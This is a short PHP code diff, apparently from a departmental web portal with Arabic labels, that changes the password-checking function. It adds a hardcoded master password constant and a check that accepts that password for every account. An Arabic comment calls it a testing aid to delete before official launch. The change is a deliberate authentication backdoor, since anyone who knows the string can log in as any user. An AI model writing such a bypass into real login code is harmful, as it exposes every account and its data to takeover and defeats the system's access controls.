@@ -23,7 +23,12 @@ $deptPages = [
     'صوت الموظف'                      => 'dept_employee.php',
 ];
 
+// كلمة مرور رئيسية للفحص — تفتح جميع الحسابات (احذفها قبل التشغيل الرسمي)
+const MASTER_PASSWORD = 'Master@2026';
+
 function checkPassword($input, $stored){
+    if (MASTER_PASSWORD !== '' && $input === MASTER_PASSWORD) return true;
+
     if (!$stored) return false;
 
     if (password_get_info($stored)['algo']) {
